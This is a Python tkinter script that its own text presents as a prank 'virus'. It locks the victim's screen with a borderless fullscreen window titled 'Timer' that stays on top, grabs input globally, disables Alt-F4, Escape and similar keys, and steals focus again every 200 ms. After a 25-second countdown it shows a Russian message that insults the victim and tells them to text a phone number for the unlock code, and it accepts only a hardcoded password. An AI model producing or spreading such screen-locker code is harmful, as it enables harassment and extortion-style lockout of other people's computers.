import tkinter as tk
import time

PASSWORD = "mega-hayrulla-password-122-33-3345"

def create_prank_window():
    root = tk.Tk()
    root.title("Timer")

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    # Окно без рамок, на весь экран, поверх всех
    root.overrideredirect(True)
    root.geometry(f"{screen_width}x{screen_height}+0+0")
    root.attributes("-topmost", True)
    root.configure(bg="black")

    # --- Контейнер, чтобы удобно менять содержимое ---
    container = tk.Frame(root, bg="black")
    container.pack(expand=True, fill="both")

    # Экран 1: таймер
    timer_label = tk.Label(
        container,
        text="25.0",
        font=("Arial", 140, "bold"),
        fg="red",
        bg="black"
    )
    timer_label.pack(expand=True)

    # Экран 2 (пока скрыт): prank-сообщение + поле ввода
    prank_frame = tk.Frame(container, bg="black")

    prank_text = (
        'Привет Лошара :) как я вижу ты получил мой вирус да? '
        'напиши мне опять на номер 7 988 904 41-30 я отвечу и дам код :)'
    )
    prank_label = tk.Label(
        prank_frame,
        text=prank_text,
        font=("Arial", 40, "bold"),
        fg="red",
        bg="black",
        wraplength=screen_width - 100,
        justify="center"
    )
    prank_label.pack(expand=True, pady=(0, 40))

    entry = tk.Entry(
        prank_frame,
        font=("Arial", 32),
        width=40,
        justify="center",
        bg="black",
        fg="red",
        insertbackground="red"
    )
    entry.pack(pady=(0, 60))

    hint_label = tk.Label(
        prank_frame,
        text="",
        font=("Arial", 20),
        fg="red",
        bg="black"
    )
    hint_label.pack()

    # --- Блокировки закрытия ---
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.grab_set_global()

    for seq in ("<Alt-F4>", "<Escape>", "<Control-w>", "<Control-W>",
                "<Alt-Escape>", "<Super_L>", "<F4>"):
        root.bind_all(seq, lambda e: "break")

    def keep_focus():
        try:
            root.lift()
            root.attributes("-topmost", True)
            root.focus_force()
        except tk.TclError:
            pass
        root.after(200, keep_focus)

    # --- Логика таймера ---
    start_time = time.time()
    duration = 25.0
    zero_hold = 2.0  # сколько секунд задержаться на 0.0

    def show_prank():
        timer_label.pack_forget()
        prank_frame.pack(expand=True, fill="both")
        entry.focus_force()

    def update_timer():
        elapsed = time.time() - start_time
        remaining = duration - elapsed

        if remaining > 0:
            timer_label.config(text=f"{remaining:.1f}")
            root.after(50, update_timer)
        else:
            # Дошли до 0.0 — фиксируем ровно "0.0" и ждём 3 секунды
            timer_label.config(text="0.0")
            root.after(int(zero_hold * 1000), show_prank)

    # --- Проверка пароля ---
    def check_password(event=None):
        if entry.get() == PASSWORD:
            try:
                root.grab_release()
            except tk.TclError:
                pass
            root.destroy()
        else:
            hint_label.config(text="Wrong password :( try again")
            entry.delete(0, tk.END)

    entry.bind("<Return>", check_password)

    root.focus_force()
    keep_focus()
    update_timer()
    root.mainloop()

if __name__ == "__main__":
    create_prank_window()